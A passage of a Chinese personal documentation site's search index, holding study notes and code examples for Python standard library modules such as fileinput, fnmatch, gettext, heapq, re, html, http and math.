此模块实现了一个辅助类和一些函数用来快速编写访问标准输入或文件列表的循环。\n如果你只想要读写一个文件请参阅 open()。 典型用法为: import fileinput\nfor line in fileinput.input(encoding=\"utf-8\"):\n    process(line) 此程序会迭代 sys.argv[1:] 中列出的所有文件内的行，如果列表为空则会使用 sys.stdin。\n如果有一个文件名为 '-'，它也会被替换为 sys.stdin 并且可选参数 mode 和 openhook 会被忽略。\n要指定替代文件列表，请将其作为第一个参数传给 input()。 也允许使用单个文件。 所有文件都默认以文本模式打开，但你可以通过在调用 input() 或 FileInput 时指定 mode 形参来重载此行为。\n如果在打开或读取文件时发生了 I/O 错误，将会引发 OSError。 在 3.3 版更改: 原来会引发 IOError；现在它是 OSError 的别名。 如果 sys.stdin 被使用超过一次，则第二次之后的使用将不返回任何行，\n除非是被交互式的使用，或都是被显式地重置 (例如使用 sys.stdin.seek(0))。 空文件打开后将立即被关闭；它们在文件列表中会被注意到的唯一情况只有当最后打开的文件为空的时候。 反回的行不会对换行符做任何处理，这意味着文件中的最后一行可能不带换行符。 你可以通过将 openhook 形参传给 fileinput.input() 或\nFileInput() 来提供一个打开钩子以便控制文件的打开方式。\n此钩子必须为一个函数，它接受两个参数 filename 和 mode，并返回一个以相应模式打开的文件类对象。\n如果指定了 encoding 和/或 errors，它们将作为额外的关键字参数被传给这个钩子。\n此模块提供了一个 hook_compressed() 来支持压缩文件。","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-fileinput.html","loc":"/yq-docs-rear-end-python-python-standard-library-fileinput.html"},{"title":"fnmatch模块","text":"介于普通字符串与 re 之间的字符串操作模块 fnmatch 模块提供了两个函数——fnmatch() 和 fnmatchcase() ，可以用来实现 这样的匹配。用法如下: if any(name.endswith(('.c', '.h')) for name in listdir(dirname)): ...\n>>> from fnmatch import fnmatch, fnmatchcase\n>>> fnmatch('foo.txt', '*.txt')\nTrue\n>>> fnmatch('foo.txt', '?oo.txt')\nTrue\n>>> fnmatch('Dat45.csv', 'Dat[0-9]*')\nTrue\n>>> names = ['Dat1.csv', 'Dat2.csv', 'config.ini', 'foo.py']\n>>> [name for name in names if fnmatch(name, 'Dat*.csv')] ['Dat1.csv', 'Dat2.csv']\n>>> fnmatch() 函数使用底层操作系统的大小写敏感规则 (不同的系统是不一样的) 来 匹配模式。比如: >>> # On OS X (Mac)\n>>> fnmatch('foo.txt', '*.TXT') False\n>>> # On Windows\n>>> fnmatch('foo.txt', '*.TXT') True\n>>> 可以使用 fnmatchcase() 来代替。它完全使用你的模 式大小写匹配。比如: >>> fnmatchcase('foo.txt', '*.TXT') False\n>>> fnmatch 使用底层操作系统的大小写敏感规则 (不同的系统是不一样的) 来 匹配模式: >>> # On OS X (Mac)\n>>> fnmatch('foo.txt', '*.TXT') False\n>>> # On Windows\n>>> fnmatch('foo.txt', '*.TXT') True\n>>> fnmatchcase","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-fnmatch.html","loc":"/yq-docs-rear-end-python-python-standard-library-fnmatch.html"},{"title":"fractions","text":"支持分数运算, 如: >>> from fractions import Fraction\n>>> a = Fraction(5, 4)\n>>> b = Fraction(7, 16)\n>>> print(a + b)\n27/16\n\n>>> # Getting numerator/denominator >>> c = a * b\n>>> c.numerator\n35\n>>> c.denominator 64","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-frames.html","loc":"/yq-docs-rear-end-python-python-standard-library-frames.html"},{"title":"gettext模块","text":"官网文档:: gettext 多语种国际化服务 为 Python 模块和应用程序提供国际化 (Internationalization, I18N)\n和本地化 (Localization, L10N) 服务. 支持 GNU gettext 消息编目 API. GUN_gettext_API 支持 高级的、基于类的 API. 可能更适合于 Python 文件 GNU gettext API 使用该 API，将会对整个应用程序产生全局的影响。 如果你的应用程序支持多语种，而语言选择取决于用户的语言环境设置，这通常正是你所想要的。 而如果你正在本地化某个 Python 模块，或者你的应用程序需要在运行时切换语言，相反你或许想用基于类的API: api_base_class 。 API: bindtextdomain textdomain gettext dgettext ngettext dngettext pgettext dpgettext npgettext dnpgettext bindtextdomain gettext.bindtextdomain(domain, localedir=None) 将 domain 绑定到本地目录 localedir。\n更具体地来说，模块 gettext 将使用路径 (在 Unix 系统中):\nlocaledir/language/LC_MESSAGES/domain.mo 查找二进制 .mo 文件，\n此处对应地查找 language 的位置是环境变量 LANGUAGE, LC_ALL, LC_MESSAGES 和 LANG 中。 如果遗漏了 localedir 或者设置为 None，那么将返回当前 domain 所绑定的值 [1] . textdomain gettext.textdomain(domain=None) 修改或查询当前的全局域。 如果 domain 为 None，则返回当前的全局域，\n不为 None 则将全局域设置为 domain，并返回它。 gettext gettext.gettext(message) 返回 message 的本地化翻译，依据包括当前的全局域、语言和语言环境目录。本函数在本地命名空间中通常有别名 _() （参考下面的示例）。 dgettext gettext.dgettext(domain, message) 与 gettext() 类似，但在指定的 domain 中查找 message。 ngettext gettext.ngettext(singular, plural, n) 与 gettext() 类似，但考虑了复数形式。\n如果找到了翻译，则将 n 代入复数公式，然后返回得出的消息（某些语言具有两种以上的复数形式）。\n如果未找到翻译，则 n 为 1 时返回 singular，为其他数时返回 plural。 复数公式取自编目头文件。\n它是 C 或 Python 表达式，有一个自变量 n，该表达式计算的是所需复数形式在编目中的索引号。\n关于在 .po 文件中使用的确切语法和各种语言的公式，请参阅 GNU gettext 文档 。 dngettext gettext.dngettext(domain, singular, plural, n) 与 ngettext() 类似，但在指定的 domain 中查找 message。 pgettext gettext.pgettext(context, message) 待补充 dpgettext gettext.dpgettext(domain, context, message) 待补充 npgettext gettext.npgettext(context, singular, plural, n) 待补充 dnpgettext gettext.dnpgettext(domain, context, singular, plural, n) 与前缀中没有 p 的相应函数类似（即 gettext(), dgettext(), ngettext(), dngettext() ），\n但是仅翻译给定的 message context。 3.8 新版功能. 注意，GNU gettext 还定义了 dcgettext() 方法，但它被认为不实用，因此目前没有实现它。 这是该 API 的典型用法示例: import gettext\ngettext.bindtextdomain('myapplication', '/path/to/my/language/directory')\ngettext.textdomain('myapplication')\n_ = gettext.gettext\n# ...\nprint(_('This is a translatable string.')) 基于类的 API 与 GNU gettext API ( GUN_gettext_API ) 相比，gettext 模块的基于类的 API 提供了更多的灵活性和更强的便利性。\n这是本地化 Python 应用程序和模块的推荐方法。\ngettext 定义了一个 GNUTranslations 类，该类实现了 GNU .mo 格式文件的解析，并且具有用于返回字符串的方法。\n本类的实例也可以将自身作为函数 _() 安装到内建命名空间中。 API: find translation install find gettext.find(domain, localedir=None, languages=None, all=False) 本函数实现了标准的 .mo 文件搜索算法。它接受一个 domain，它与 textdomain() 接受的域相同。\n可选参数 localedir 与 bindtextdomain() 中的相同。\n可选参数 languages 是多条字符串的列表，其中每条字符串都是一种语言代码。 如果没有传入 localedir，则使用默认的系统语言环境目录 [1] 如果没有传入 languages，则搜索以下环境变量：LANGUAGE、LC_ALL、LC_MESSAGES 和 LANG。\n从这些变量返回的第一个非空值将用作 languages 变量。\n环境变量应包含一个语言列表，由冒号分隔，该列表会被按冒号拆分，以产生所需的语言代码字符串列表。 find() 将扩展并规范化 language，然后遍历它们，搜索由这些组件构建的现有文件: localedir/language/LC_MESSAGES/domain.mo find() 返回找到类似的第一个文件名。如果找不到这样的文件，则返回 None。如果传入了 all，它将返回一个列表，包含所有文件名，并按它们在语言列表或环境变量中出现的顺序排列。 translation gettext.translation(domain, localedir=None, languages=None, class_=None, fallback=False) languages: list 默认为空则使用系统当前的LANG环境变量的值;\n不为空, 如 ['en'] , 表示自定义设置语言. 根据 domain、localedir 和 languages，返回 *Translations 实例，\n首先应将前述参数传入 find() 以获取关联的 .mo 文件路径的列表。名\n字与 .mo 文件名相同的实例将被缓存。如果传入 class_，它将是实际被实例化的类，否则实例化 GNUTranslations。\n类的构造函数必须只接受一个 文件对象 参数。\n如果传入 codeset，那么在 lgettext() 和 lngettext() 方法中，对翻译后的字符串进行编码的字符集将被改变。 如果找到多个文件，后找到的文件将用作先前文件的替补。\n为了设置替补，将使用 copy.copy() 从缓存中克隆每个 translation 对象。\n实际的实例数据仍在缓存中共享。 如果 .mo 文件未找到，且 fallback 为 false（默认值），则本函数引发 OSError 异常，\n如果 fallback 为 true，则返回一个 NullTranslations 实例。 在 3.3 版更改: 曾经是 IOError 被引发而不是 OSError 。 在 3.11 版更改: codeset parameter is removed. install gettext.install(domain, localedir=None, *, names=None) This installs the function _() in Python's builtins namespace, based on domain and localedir which are passed to the function translation(). 通过 translation , 安装 _() 到 Python 命名空间 全局性更改 names 参数的信息请参阅 translation 对象的 install() 方法的描述。 如下所示，通常将字符串包括在 _() 函数的调用中，以标记应用程序中待翻译的字符串，就像这样: print(_('This string will be translated.'))\n为了方便，一般将 _() 函数安装在 Python 内建命名空间中，以便在应用程序的所有模块中轻松访问它。 在 3.11 版更改: names is now a keyword-only parameter. 本地化 部分本地化: import gettext\nt = gettext.translation('spam', '/usr/share/locale')\n_ = t.gettext 全局本地化: import gettext\n\nlang1 = gettext.translation('myapplication', languages=['en'])\nlang2 = gettext.translation('myapplication', languages=['fr'])\nlang3 = gettext.translation('myapplication', languages=['de'])\n\n# start by using language1\nlang1.install()\n\n# ... time goes by, user selects language 2\nlang2.install()\n\n# ... more time goes by, user selects language 3\nlang3.install() [1] ( 1 , 2 ) 不同系统的默认语言环境目录是不同的；\n比如在 RedHat Linux 上是 /usr/share/locale，\n在 Solaris 上是 /usr/lib/locale。\ngettext 模块不会支持这些基于不同系统的默认值；\n而它的默认值为 sys.base_prefix/share/locale （请参阅 sys.base_prefix）。\n基于上述原因，最好每次都在应用程序的开头使用明确的绝对路径来调用 bindtextdomain 。","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-gettext.html","loc":"/yq-docs-rear-end-python-python-standard-library-gettext.html"},{"title":"heapq","text":"官网: heapq --- 堆队列算法 模块提供了堆队列算法的实现，也称为优先队列算法. 堆是一个二叉树，它的每个父节点的值都只会小于或等于所有孩子节点（的值）。\n它使用了数组来实现：从零开始计数，对于所有的 k ，都有 heap[k] <= heap[2*k+1] 和 heap[k] <= heap[2*k+2]。\n为了便于比较，不存在的元素被认为是无限大。 堆最有趣的特性在于最小的元素总是在根结点：heap[0]。 堆的分类 大根堆 大根堆的每个子树，根节点是整个树中最大的数据，\n每个节点的数据都比其子节点大 小根堆 小根堆的根节点数据是最小的数据，每个节点的数据都比其子节点小 API与教材的堆算法实现有所不同，具体区别有两方面 我们使用了从零开始的索引。\n这使得节点和其孩子节点索引之间的关系不太直观但更加适合，因为 Python 使用从零开始的索引。 我们的 pop 方法返回最小的项而不是最大的项（这在教材中称为\"最小堆\"；而\"最大堆\"在教材中更为常见，因为它更适用于原地排序）。 创建一个堆，可以使用list来初始化为 [] ，或者你可以通过一个函数 heapify() ，来把一个list转换成堆。 支持函数 heappush , 推入值到堆 heappop , 弹出值 heappushpop , 相当于 先做 heappush , 再做 heappop heapify , 将 list 原地转换为 堆 heapreplace merge nlargest nsmallest heapq.heappush(heap, item) 将 item 的值加入 heap 中，保持堆的不变性。 heapq.heappop(heap) 弹出并返回 heap 的最小的元素，保持堆的不变性。\n如果堆为空，抛出 IndexError 。使用 heap[0] ，可以只访问最小的元素而不弹出它。 heapq.heappushpop(heap, item) 将 item 放入堆中，然后弹出并返回 heap 的最小元素。\n该组合操作比先调用 heappush() 再调用 heappop() 运行起来更有效率。 heapq.heapify(x) 将list x 转换成堆，原地，线性时间内。 heapq.heapreplace(heap, item) 弹出并返回 heap 中最小的一项，同时推入新的 item。 堆的大小不变。 如果堆为空则引发 IndexError。 这个单步骤操作比 heappop() 加 heappush() 更高效，并且在使用固定大小的堆时更为适宜。\npop/push 组合总是会从堆中返回一个元素并将其替换为 item。 返回的值可能会比添加的 item 更大。 如果不希望如此，可考虑改用 heappushpop()。\n它的 push/pop 组合会返回两个值中较小的一个，将较大的值留在堆中。 该模块还提供了三个基于堆的通用功能函数。 heapq.merge(*iterables, key=None, reverse=False) 将多个已排序的输入合并为一个已排序的输出（例如，合并来自多个日志文件的带时间戳的条目）。 返回已排序值的 iterator。 类似于 sorted(itertools.chain(*iterables)) 但返回一个可迭代对象，\n不会一次性地将数据全部放入内存，并假定每个输入流都是已排序的（从小到大）。 具有两个可选参数，它们都必须指定为关键字参数。 key 指定带有单个参数的 key function，用于从每个输入元素中提取比较键。 默认值为 None (直接比较元素)。 reverse: bool 如果设为 True，则输入元素将按比较结果逆序进行合并。\n要达成与 sorted(itertools.chain(*iterables), reverse=True) 类似的行为，所有可迭代对象必须是已从大到小排序的。 在 3.5 版更改: 添加了可选的 key 和 reverse 形参。 heapq.nlargest(n, iterable, key=None) 从 iterable 所定义的数据集中返回前 n 个最大元素组成的列表。\n如果提供了 key 则其应指定一个单参数的函数，用于从 iterable 的每个元素中提取比较键 (例如 key=str.lower)。\n等价于: sorted(iterable, key=key, reverse=True)[:n]。 heapq.nsmallest(n, iterable, key=None) 从 iterable 所定义的数据集中返回前 n 个最小元素组成的列表。\n如果提供了 key 则其应指定一个单参数的函数，用于从 iterable 的每个元素中提取比较键 (例如 key=str.lower)。\n等价于: sorted(iterable, key=key)[:n]。 后两个函数在 n 值较小时性能最好。\n对于更大的值，使用 sorted() 函数会更有效率。\n此外，当 n==1 时，使用内置的 min() 和 max() 函数会更有效率。\n如果需要重复使用这些函数，请考虑将可迭代对象转为真正的堆。","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-heapq.html","loc":"/yq-docs-rear-end-python-python-standard-library-heapq.html"},{"title":"re","text":"通过正则表达式对字符串进⾏匹配 r 在带有 'r' 前缀的字符串字面值中，反斜杠不必做任何特殊处理。\n因此 r\"n\" 表示包含 '' 和 'n' 两个字符的字符串，\n而 \"n\" 则表示只包含一个换行符的字符串。 re.match函数 re.match(pattern, string, flags=0) pattern 匹配的正则表达式 string 要匹配的字符串 flags 标志位，用于控制正则表达式的匹配方式，\n如：是否区分大小写，多行匹配等等。 re.I 忽略大小写 re.L 表示特殊字符集 w, W, b, B, s, S 依赖于当前环境 re.M 多行模式 re.S 即为 . 并且包括换行符在内的任意字符（. 不包括换行符） re.U 表示特殊字符集 w, W, b, B, d, D, s, S 依赖于 Unicode 字符属性数据库 re.X 为了增加可读性，忽略空格和 # 后面的注释 re.compile 函数 compile 函数用于编译正则表达式，生成一个正则表达式（ Pattern ）对象，供 match() 和 search() 这两个函数使用: prog = re.compile(pattern)\nresult = prog.match(string) 等价于: result = re.match(pattern, string) 不过对于匹配使用的较多情况下, 可以使用全局的compile来节省时间. 举例: >>>import re\n>>> pattern = re.compile(r'\\d+')\nm = pattern.match('one12twothree34four', 3, 10) # 从'1'的位置开始匹配，正好匹配\n>>> print m                                         # 返回一个 Match 对象\n<_sre.SRE_Match object at 0x10a42aac0>\n>>> m.group(0)   # 可省略 0\n'12'\n>>> m.start(0)   # 可省略 0\n3\n>>> m.end(0)     # 可省略 0\n5\n>>> m.span(0)    # 可省略 0\n(3, 5) 在上面，当匹配成功时返回一个 Match 对象，其中： group([group1, …]) 方法用于获得一个或多个分组匹配的字符串，当要获得整个匹配的子串时，可直接使用 group() 或 group(0)； start([group]) 方法用于获取分组匹配的子串在整个字符串中的起始位置（子串第一个字符的索引），参数默认值为 0； end([group]) 方法用于获取分组匹配的子串在整个字符串中的结束位置（子串最后一个字符的索引+1），参数默认值为 0； span([group]) 方法返回 (start(group), end(group)) re.search函数 re.search 扫描整个字符串并返回第一个成功的匹配，如果没有匹配，就返回一个 None。 re.match与re.search的区别: re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None re.search匹配整个字符串，直到找到一个匹配 举例: import re\nret = re.search(r\"\\d+\", \"阅读次数为9999\")\nprint(ret.group())\n#结果：9999 re.findall函数 在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果没有找到匹配的，则返回空列表。 注意： match 和 search 是匹配一次 findall 匹配所有。 举例: import re\nret = re.findall(r\"\\d+\", \"python = 9999, c = 7890, c++ = 12345\")\nprint(ret)\n#结果：['9999', '7890', '12345'] 举例2: import re\nalist = ['a','b','c']\nif re.findall('.$','dfghc')[0] in alist:\n  print 'yes1'\nif re.findall('.$','dfgh')[0] in alist:\n  print 'yes2'\nprint 'over'\n#输出：\n#yes1\n#over\n\n#re.findall('.$','dfghc')其实是返回一个列表\n#但是匹配是找出结尾的字符所以只有一个，使用[0]获取\n#然后判断是否存在于alist re.finditer函数 和 findall 类似，在字符串中找到正则表达式所匹配的所有子串，并把它们作为一个迭代器返回: import re\nit = re.finditer(r\"\\d+\", \"12a32bc43jf3\")\nfor match in it:\n  print(match.group())\n\n#结果：\n#12\n#32\n#43\n#3 re.sub函数 sub是substitute的所写，表示替换，将匹配到的数据进⾏替换。 re.sub(pattern, repl, string, count=0, flags=0) pattern 必选，表示正则中的模式字符串 repl 必选，就是replacement，要替换的字符串，也可为一个函数 string 必选，被替换的那个string字符串 count 可选参数，count 是要替换的最大次数，必须是非负整数。如果省略这个参数或设为 0，所有的匹配都会被替换 flag 可选参数，标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等 举例：将匹配到的阅读次数加1 方法一: import re\nret = re.sub(r\"\\d+\", '998', \"python = 997\")\nprint(ret) 结果：python = 998 方法二: import re\ndef add(temp):\n  #int（）参数必须是字符串，类似字节的对象或数字，而不是\"re.Match\"\n  strNum = temp.group()\n  num = int(strNum) + 1\n  return str(num)\nret = re.sub(r\"\\d+\", add, \"python = 997\")\nprint(ret)\nret = re.sub(r\"\\d+\", add, \"python = 99\")\nprint(ret)\n\n#这里不懂是怎么把后面的参数传递过去的，\n#好像python就是这样传递参数的？但是有尝试将temp打印，出来是一个地址好像，并不是预期的字符串\n#理解是正常情况下传递的应该是整个字符串，但是这里使用了正则表达式匹配数字，所以只传递了数字，然后使用group函数来获取\n#根据这个思路尝试了一下\n#将匹配规则更改为\"r\".+\",输出temp.group的值正常，temp为地址，re会将参数传递更改为地址传递 结果: python = 998\npython = 100 re.subn函数 行为与sub()相同，但是返回一个元组 (字符串, 替换次数): re.subn(pattern, repl, string[, count]) 返回: (sub(repl, string[, count]), 替换次数) 例如: import re\npattern = re.compile(r'(\\w+) (\\w+)')\ns = 'i say, hello world!'\nprint(re.subn(pattern, r'\\2 \\1', s))\ndef func(m):\n  return m.group(1).title() + ' ' + m.group(2).title()\nprint(re.subn(pattern, func, s))\n### output ###\n# ('say i, world hello!', 2)\n# ('I Say, Hello World!', 2) re.split函数 根据匹配进⾏切割字符串，并返回⼀个列表。 re.split(pattern, string, maxsplit=0, flags=0) pattern 匹配的正则表达式 string 要匹配的字符串 maxsplit 分隔次数，maxsplit=1 分隔一次，默认为 0，不限制次数 举例: import re\nret = re.split(r\":| \",\"info:xiaoZhang 33 shandong\")\nprint(ret) 结果：['info', 'xiaoZhang', '33', 'shandong'] python贪婪和⾮贪婪 Python⾥数量词默认是贪婪的（在少数语⾔⾥也可能是默认⾮贪婪），总是尝试匹配尽可能多的字符；⾮贪婪则相反，总是尝试匹配尽可能少的字符。 例如：正则表达式\"ab*\"如果用于查找\"abbbc\"，将找到\"abbb\"。而如果使用非贪婪的数量词\"ab*?\"，将找到\"a\"。 注：我们一般使用非贪婪模式来提取。 在\"*\",\"?\",\"+\",\"{m,n}\"后⾯加上？，使贪婪变成⾮贪婪。 举例1: import re\n\ns=\"This is a number 234-235-22-423\"\n\n#正则表达式模式中使⽤到通配字，那它在从左到右的顺序求值时，会尽量\"抓取\"满⾜匹配最⻓字符串，在我们上⾯的例⼦⾥⾯，\".+\"会从字符串的启始处抓取满⾜模式的最⻓字符，其中包括我们想得到的第⼀个整型字段的中的⼤部分，\"\\d+\"只需⼀位字符就可以匹配，所以它匹配了数字\"4\"，⽽\".+\"则匹配了从字符串起始到这个第⼀位数字4之前的所有字符\n\nr=re.match(\".+(\\d+-\\d+-\\d+-\\d+)\",s)\nprint(r.group(1))\n\n#⾮贪婪操作符\"？\"，这个操作符可以⽤在\"*\",\"+\",\"?\"的后⾯，要求正则匹配的越少越好\nr=re.match(\".+?(\\d+-\\d+-\\d+-\\d+)\",s)\nprint(r.group(1)) 结果: 4-235-22-423\n234-235-22-423 举例2: >>> re.match(r\"aa(\\d+)\",\"aa2343ddd\").group(1)\n'2343'\n>>> re.match(r\"aa(\\d+?)\",\"aa2343ddd\").group(1)\n'2'\n>>> re.match(r\"aa(\\d+)ddd\",\"aa2343ddd\").group(1)\n'2343'\n>>> re.match(r\"aa(\\d+?)ddd\",\"aa2343ddd\").group(1)\n'2343' 举例3：提取图片地址: import re\ntest_str=\"<img data-original=https://rpic.douyucdn.cn/appCovers/2016/11/13/1213973.jpg>\"\nret = re.search(r\"https://.*?.jpg\", test_str)\nprint(ret.group()) r的作⽤ r：在带有 'r' 前缀的字符串字面值中，反斜杠不必做任何特殊处理。 因此 r\"n\" 表示包含 '' 和 'n' 两个字符的字符串，而 \"n\" 则表示只包含一个换行符的字符串。 与大多数编程语言相同，正则表达式里使用\"\"作为转义字符，这就可能造成反斜杠困扰。假如你需要匹配文本中的字符\"\"，那么使用编程语言表示的正则表达式里将需要4个反斜杠\"\\\\\"：前两个和后两个分别用于在编程语言里转义成反斜杠，转换成两个反斜杠后再在正则表达式里转义成一个反斜杠。Python里的原生字符串很好地解决了这个问题，Python中字符串前⾯加上 r 表示原⽣字符串。 （前两个和后两个分别用于在编程语言里转义成反斜杠，转换成两个反斜杠后再在正则表达式里转义成一个反斜杠。） 例: import re\nmm = \"c:\\\\a\\\\b\\\\c\"\nprint(mm)#c:\\a\\b\\c\nret = re.match(\"c:\\\\\\\\\",mm).group()\nprint(ret)#c:\\\nret = re.match(\"c:\\\\\\\\a\",mm).group()\nprint(ret)#c:\\a\nret = re.match(r\"c:\\\\a\",mm).group()\nprint(ret)#c:\\a\nret = re.match(r\"c:\\a\",mm).group()\nprint(ret)#AttributeError: 'NoneType' object has no attribute 'group' 正则匹配规则(基本适用所有语言) 匹配单个字符 字符 功能 位置 . 匹配任意1个字符（除了n） [ ] 匹配[ ]中列举的字符 d 匹配数字，即0-9 可以写在字符集[...]中 D 匹配⾮数字，即不是数字 可以写在字符集[...]中 s 匹配空⽩，即空格，tab键 可以写在字符集[...]中 S 匹配⾮空⽩字符 可以写在字符集[...]中 w 匹配单词字符，即a-z、A-Z、0-9、_ 可以写在字符集[...]中 W 匹配⾮单词字符 可以写在字符集[...]中 使用括号匹配的内容, 可以用 \\1 , \\2 表示, 如: In [17]: re.sub(r'([a-z]+)([A-Z)]+)', r'\\1_\\2', 'distributeType').lower()\nOut[17]: 'distribute_type'\n\n# 这里不懂为什么加不加 + 一样\n# todo: +\nIn [18]: re.sub(r'([a-z])([A-Z)])', r'\\1_\\2', 'distributeType').lower()\nOut[18]: 'distribute_type' \\s ：表示匹配空白字符，包括空格、制表符、换行符等。它与[rntfv ]等效。 \\b ：表示匹配单词边界。一个单词被定义为由字母或数字组成的字符序列。b匹配位于单词开头或结尾的位置，而不匹配任何实际字符。","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-hot.html","loc":"/yq-docs-rear-end-python-python-standard-library-hot.html"},{"title":"html","text":"官网: html --- 超文本标记语言支持 该模块定义了操作HTML的工具。 html.escape(s, quote=True) 将字符串 s 中的字符``&`` 、 < 和 > 转换为安全的HTML序列。\n如果需要在 HTML 中显示可能包含此类字符的文本，请使用此选项。\n如果可选的标志 quote 为真值，则字符 (\") 和 (') 也被转换；\n这有助于包含在由引号分隔的 HTML 属性中，如 <a href=\"...\">。 3.2 新版功能. html.unescape(s) 将字符串 s 中的所有命名和数字字符引用 (例如 &gt;, &#62;, &#x3e;) 转换为相应的Unicode字符。\n此函数使用HTML 5标准为有效和无效字符引用定义的规则，以及 HTML 5 命名字符引用列表。 3.4 新版功能. html 包中的子模块是： html.parser —— 具有宽松解析模式的HTML / XHTML解析器\nhtml.entities -- HTML 实体定义 html.parser 官网: https://docs.python.org/zh-cn/3/library/html.parser.html#module-html.parser 简单的 HTML 和 XHTML 解析器 这个模块定义了一个 HTMLParser 类，为 HTML（超文本标记语言）和 XHTML 文本文件解析提供基础。 class html.parser.HTMLParser(*, convert_charrefs=True) 创建一个能解析无效标记的解析器实例。 如果 convert_charrefs 为 True (默认值)，则所有字符引用( script/style 元素中的除外)都会自动转换为相应的 Unicode 字符。 一个 HTMLParser 类的实例用来接受 HTML 数据，并在标记开始、标记结束、文本、注释和其他元素标记出现的时候调用对应的方法。要实现具体的行为，请使用 HTMLParser 的子类并重载其方法。 这个解析器不检查结束标记是否与开始标记匹配，也不会因外层元素完毕而隐式关闭了的元素引发结束标记处理。 在 3.4 版更改: convert_charrefs 关键字参数被添加。 在 3.5 版更改: convert_charrefs 参数的默认值现在为 True。 html.entities HTML 一般实体的定义 该模块定义了四个词典， html5、 name2codepoint、 codepoint2name、以及 entitydefs。 html.entities.html5 将 HTML5 命名字符引用 1 映射到等效的 Unicode 字符的字典，例如 html5['gt;'] == '>'。\n请注意，尾随的分号包含在名称中（例如 'gt;' ），但是即使没有分号，一些名称也会被标准接受，\n在这种情况下，名称出现时带有和不带有 ';'。另见 html.unescape()。 3.3 新版功能. html.entities.entitydefs 将 XHTML 1.0 实体定义映射到 ISO Latin-1 中的替换文本的字典。 html.entities.name2codepoint 将 HTML 实体名称映射到 Unicode 代码点的字典。 html.entities.codepoint2name 将 Unicode 代码点映射到 HTML 实体名称的字典。","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-html.html","loc":"/yq-docs-rear-end-python-python-standard-library-html.html"},{"title":"http","text":"官网: http --- HTTP 模块 http 是一个包，它收集了多个用于处理超文本传输协议的模块: http.client 是一个底层的 HTTP 协议客户端；对于高层级的 URL 访问请使用 urllib.request http.server 包含基于 socketserver 的基本 HTTP 服务类 http.cookies 包含一些有用来实现通过 cookies 进行状态管理的工具 http.cookiejar 提供了 cookies 的持久化 http.HTTPStatus http状态码 常见用法 命令行启动一个HTTP服务 python -m http.server -b 127 .0.0.1 8000 API http.HTTPStatus enum.IntEnum 的子类，它定义了组 HTTP 状态码，原理短语以及用英语书写的长描述文本。 用法： from http import HTTPStatus HTTPStatus . OK == 200 # True HTTPStatus . OK . value # 200 HTTPStatus . OK . phrase # 'OK' HTTPStatus . OK . description # 'Request fulfilled, document follows' list ( HTTPStatus ) # [HTTPStatus.CONTINUE, HTTPStatus.SWITCHING_PROTOCOLS, ...]","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-http.html","loc":"/yq-docs-rear-end-python-python-standard-library-http.html"},{"title":"inspect","text":"inspect.signature 可进行参数检查","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-inspect.html","loc":"/yq-docs-rear-end-python-python-standard-library-inspect.html"},{"title":"math","text":"官网: math --- 数学函数 该模块提供了对C标准定义的数学函数的访问。 这些函数不适用于复数；如果你需要计算复数，请使用 cmath 模块中的同名函数。\n将支持计算复数的函数区分开的目的，来自于大多数开发者并不愿意像数学家一样需要学习复数的概念。\n得到一个异常而不是一个复数结果使得开发者能够更早地监测到传递给这些函数的参数中包含复数，进而调查其产生的原因。 该模块提供了以下函数。除非另有明确说明，否则所有返回值均为浮点数。 数论与表示函数 math.ceil(x) 返回 x 的向上取整，即大于或等于 x 的最小的整数。如果 x 不是浮点数，委托给 x.__ceil__ ，它应该返回一个 Integral 的值。 math.comb(n, k) 返回不重复且无顺序地从 n 项中选择 k 项的方式总数。 当 k <= n 时取值为 n! / (k! * (n - k)!)；当 k > n 时取值为零。 Also called the binomial coefficient because it is equivalent to the coefficient of k-th term in polynomial expansion of (1 + x)ⁿ. 如果任一参数不为整数则会引发 TypeError。 如果任一参数为负数则会引发 ValueError。 3.8 新版功能. math.copysign(x, y) 返回一个基于 x 的绝对值和 y 的符号的浮点数。在支持带符号零的平台上，copysign(1.0, -0.0) 返回 -1.0. math.fabs(x) 返回 x 的绝对值。 math.factorial(n) Return n factorial as an integer. Raises ValueError if n is not integral or is negative. 3.9 版后已移除: 接受具有整数值的浮点数 (例如 5.0) 的行为已被弃用。 math.floor(x) 返回 x 的向下取整，小于或等于 x 的最大整数。如果 x 不是浮点数，则委托给 x.__floor__ ，它应返回一个 Integral 值。 math.fmod(x, y) 返回 fmod(x, y) ，由平台C库定义。请注意，Python表达式 x % y 可能不会返回相同的结果。\nC标准的目的是 fmod(x, y) 完全（数学上；到无限精度）等于 x - n*y 对于某个整数 n ，使得结果具有 与 x 相同的符号和小于 abs(y) 的幅度。\nPython的 x % y 返回带有 y 符号的结果，并且可能不能完全计算浮点参数。\n例如， fmod(-1e-100, 1e100) 是 -1e-100 ，但Python的 -1e-100 % 1e100 的结果是 1e100-1e-100 ，\n它不能完全表示为浮点数，并且取整为令人惊讶的 1e100 。\n出于这个原因，函数 fmod() 在使用浮点数时通常是首选，而Python的 x % y 在使用整数时是首选。 math.frexp(x) 以 (m, e) 对的形式返回 x 的尾数和指数。\nm 是一个浮点数， e 是一个整数，正好是 x == m * 2**e 。 如果 x 为零，则返回 (0.0, 0) ，否则返回 0.5 <= abs(m) < 1 。这用于以可移植方式\"分离\"浮点数的内部表示。 math.fsum(iterable) 返回迭代中的精确浮点值。通过跟踪多个中间部分和来避免精度损失: sum([.1, .1, .1, .1, .1, .1, .1, .1, .1, .1])\n0.9999999999999999\nfsum([.1, .1, .1, .1, .1, .1, .1, .1, .1, .1])\n1.0 该算法的准确性取决于IEEE-754算术保证和舍入模式为半偶的典型情况。在某些非Windows版本中，底层C库使用扩展精度添加，并且有时可能会使中间和加倍，导致它在最低有效位中关闭。 有关待进一步讨论和两种替代方法，参见 ASPN cookbook recipes for accurate floating point summation。 math.gcd(*integers) 返回给定的整数参数的最大公约数。 如果有一个参数非零，则返回值将是能同时整除所有参数的最大正整数。 